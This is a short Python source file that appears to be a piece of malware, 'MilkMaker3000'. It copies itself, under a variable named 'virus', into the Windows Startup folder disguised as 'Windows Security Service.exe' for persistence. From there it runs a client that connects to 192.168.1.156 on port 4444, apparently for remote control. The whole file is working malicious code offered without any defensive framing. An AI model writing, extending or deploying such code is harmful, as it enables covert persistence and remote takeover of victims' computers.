import os
from client import Client

class MilkMaker3000:
    def __init__(self, server_ip, server_port):
        self.c = Client(server_ip, server_port)
        self.launcherPath = os.getenv("appdata")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Windows Security Service.exe"
    
    def installLauncher(self):
        f = open(os.path.realpath(__file__), 'rb')
        virus = f.read()
        f.close()
        f = open(self.launcherPath, 'wb')
        f.write(virus)
        f.close()

    def run(self):
        if "Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" in os.path.realpath(__file__):
            self.c.run()
        else:
            if not os.path.exists(self.launcherPath):
                self.installLauncher()
            exit()

v = MilkMaker3000("192.168.1.156", 4444)
v.run()